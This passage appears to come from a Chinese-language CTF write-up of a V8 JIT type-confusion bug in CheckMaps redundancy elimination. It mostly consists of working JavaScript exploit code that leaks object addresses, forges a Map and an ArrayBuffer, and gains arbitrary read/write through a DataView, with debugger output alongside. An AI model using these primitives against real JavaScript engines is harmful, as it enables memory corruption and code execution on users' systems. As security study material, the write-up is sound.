IrOpcode::kCheckMaps) &#123;</span><br><span class="line">+      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+      &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>每一个对象都有一个map来标记这个对象的类型，而checkmap就是用来检查这个对象的类型有没有变化的。<br>如果没变的话就可以一直走fast path，否则就要baliout。<br>根据给出的含漏洞的patch可知,JIT优化中的函数调用层次如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.Get(node)) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Reduction RedundancyElimination::ReduceCheckNode(Node* node) &#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先在Reduce里遇到CheckMaps的时候<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br></pre></td></tr></table></figure></p><p>为了找到最优的dominates，会去遍历其他的check<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br></pre></td></tr></table></figure></p><p>如果找到其他的CheckMaps的话，会检查是否“兼容”，会去看它们的maps，如果第一个检查已经包含第二个检查的话，就会把第二个检查给去掉。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    ...</span><br><span class="line">    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">            DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">            <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>type confusion可以让我们得到对于用户空间任何object的读写权限，可以将任意一个对象的指针当成一个double读出来，也可以将任意一个double当成一个对象的指针写进去，这样我们就可以在一个地址伪造一个对象。</p><p>通过type confusion去fake map，fake ArrayBuffer，然后通过改我们fake的ArrayBuffer的BackingStore得到任意地址读写的原语。</p><h3 id="fake-map-prototype-amp-amp-constructor"><a href="#fake-map-prototype-amp-amp-constructor" class="headerlink" title="fake map prototype&amp;&amp;constructor"></a>fake map prototype&amp;&amp;constructor</h3><p><strong>PS.事实上这步可能不需要。只是当时学习别人exp的时候写的</strong><br>通过type confusion去leak ab的prototype地址，且由于prototype和constructor的地址偏移是固定的，所以可以去通过prototype的地址去计算出constructor的地址，然后将他们写入我们要fake的map对应的位置。<br>不过也可以直接用<code>ab.__proto__.constructor</code>得到constructor的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">要被leak的ArrayBuffer</span><br><span class="line">DebugPrint: 0x130c771022d9: [JSArrayBuffer]</span><br><span class="line"> - map = 0x228d52a02f71 [FastProperties]</span><br><span class="line">...</span><br><span class="line">0x228d52a02f71: [Map]</span><br><span class="line"> - type: JS_ARRAY_BUFFER_TYPE</span><br><span class="line">...</span><br><span class="line"> - prototype: 0x34f96880b7b9 &lt;Object map = 0x228d52a02fc1&gt;</span><br><span class="line"> - constructor: 0x34f96880b609 &lt;JSFunction ArrayBuffer (sfi = 0x157dbc033711)&gt;</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">34f96880b7b9</span><br><span class="line">34f96880b609</span><br></pre></td></tr></table></figure></p><h3 id="fake-map并leak出来"><a href="#fake-map并leak出来" class="headerlink" title="fake map并leak出来"></a>fake map并leak出来</h3><p>前后两次gc()，让ab_map_obj这个double array移动到old space里，并且让其和它的elements地址偏移恒定。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">//0xdaba0000daba0000，写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,     <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">6.73490047e-316</span>,            <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use constructor replace it</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3e0338a149e9: [JSArray] in OldSpace</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> - elements = 0x3e0338a14a49 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">           0: -1.1264e+129</span><br><span class="line">           1: 3.4771e-308</span><br><span class="line">           2: 6.7349e-316</span><br><span class="line">         3-4: -1.1264e+129</span><br><span class="line">           5: 0</span><br><span class="line"> &#125;</span><br><span class="line">我们要fake的map在elements里，而elements的前面0x10分别是map和length，所以</span><br><span class="line">0x3e0338a14a49 + 0x10 -0x3e0338a149e9 = 0x70</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0x3e0338a14a49-1</span><br><span class="line">0x3e0338a14a48:0x000037d6d7302de10x0000000600000000</span><br><span class="line">0x3e0338a14a58:0xdaba0000daba00000x001900c60f00000a</span><br><span class="line">0x3e0338a14a68:0x00000000082003ff0xdaba0000daba0000</span><br><span class="line">0x3e0338a14a78:0xdaba0000daba00000x0000000000000000</span><br><span class="line">0x3e0338a14a88:0x000037d6d73022010x0006b57800000000</span><br></pre></td></tr></table></figure><p>然后将其ab_map_obj的地址leak出来，加上0x70就是我们fake的map的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"要leak出ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br></pre></td></tr></table></figure></p><p>这里顺便说一句，无论是leak还是fake的时候，得到的都是double，写入的也是按照double写入，这个调试一下就知道了。</p><h3 id="fake-ArrayBuffer并leak出来"><a href="#fake-ArrayBuffer并leak出来" class="headerlink" title="fake ArrayBuffer并leak出来"></a>fake ArrayBuffer并leak出来</h3><p>在map被fake好了之后，我们就可以fake ArrayBuffer得到任意地址读写的原语了。<br>依然是前后两次gc()，然后fake一个ArrayBuffer结构。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr, <span class="comment">//我们fake的map地址</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span> <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure></p><p>然后将这个fake好的ArrayBuffer的地址leak出来，依然是先leak fake_ab这个JSArray的地址，然后根据偏移0x70找到我们在elements里fake的ArrayBuffer的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br></pre></td></tr></table></figure></p><p>log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">leak出的map地址是810f1c94a01</span><br><span class="line"></span><br><span class="line">要leak出的fake_ab的数组</span><br><span class="line">DebugPrint: 0x810f1c96e29: [JSArray] in OldSpace</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> - elements = 0x810f1c96e89 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">         0-2: 4.3818e-311</span><br><span class="line">           3: 3.47668e-310</span><br><span class="line">         4-5: 3.4771e-308</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">810f1c96e99</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0x810f1c96e89-1</span><br><span class="line">0x810f1c96e88:0x0000361a14882de1--&gt;fixedArray真正的map 0x0000000600000000--&gt;fixedArray的length</span><br><span class="line">下面才是我们fake的ArrayBuffer</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x810f1c96e98:0x00000810f1c94a01--&gt;fake map0x00000810f1c94a01--&gt;随便</span><br><span class="line">0x810f1c96ea8:0x00000810f1c94a01--&gt;随便0x0000400000000000--&gt;length</span><br><span class="line">0x810f1c96eb8:0x001900c60f00000a--&gt;backingstore0x001900c60f00000a--&gt;随便</span><br><span class="line">0x810f1c96ec8:0x0000361a148822010x0006913800000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">0x810f1c96e89+0x10-0x810f1c96e29=0x70</span><br></pre></td></tr></table></figure></p><h3 id="将我们fake的ArrayBuffer当成一个JSObject读出来"><a href="#将我们fake的ArrayBuffer当成一个JSObject读出来" class="headerlink" title="将我们fake的ArrayBuffer当成一个JSObject读出来"></a>将我们fake的ArrayBuffer当成一个JSObject读出来</h3><p>我们可以在callback里改掉array的类型，比如将一个double array改成了object array，但是由于type confusion，我们在第二次对arr[0]重新写入值的时候，依然把arr当成一个double array，并将其写入。<br>这样实际上，我们把一个double的数值当成一个object指针写入。</p><p>如下，写入之后，arrr[0]将由于我们fake的arraybuffer的map，被视作一个arraybuffer对待，于是可以用它来初始化一个DataView。</p><p>DataView就可以操作这个fake的ArrayBuffer的BackingStore地址对应的内存。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br></pre></td></tr></table></figure><h3 id="leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore"><a href="#leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore" class="headerlink" title="leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore"></a>leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore</h3><p>由此，我们就可以读取对应于code指针所在地址的code指针的值。<br>如下图log，我需要得到code的地址，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0xac9a5c986c9</span><br><span class="line">0xac9a5c986c9: [Function] in OldSpace</span><br><span class="line"> - map = 0x3a6b959824d1 [FastProperties]</span><br><span class="line"> - prototype = 0x2e1993f04669</span><br><span class="line"> - elements = 0x21df6cd02251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - initial_map = </span><br><span class="line"> - shared_info = 0x2e1993f3ceb9 &lt;SharedFunctionInfo&gt;</span><br><span class="line"> - name = 0x21df6cd02441 &lt;String[0]: &gt;</span><br><span class="line"> - formal_parameter_count = 0</span><br><span class="line"> - kind = [ NormalFunction ]</span><br><span class="line"> - context = 0x2e1993f03d91 &lt;FixedArray[281]&gt;</span><br><span class="line"> - code = 0x19d27c522f01 &lt;Code BUILTIN&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0xac9a5c986c9-1</span><br><span class="line">0xac9a5c986c8:0x00003a6b959824d10x000021df6cd02251</span><br><span class="line">0xac9a5c986d8:0x000021df6cd022510x000021df6cd02321</span><br><span class="line">0xac9a5c986e8:0x00002e1993f3ceb90x00002e1993f03d91</span><br><span class="line">0xac9a5c986f8:0x00002e1993f3d0910x000019d27c522f01--&gt;code</span><br></pre></td></tr></table></figure></p><p>从图中可以看出来，就是function-1（这个减一是因为v8中指针末位都置为1，需要去掉）+0x38，我们把它leak出来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span 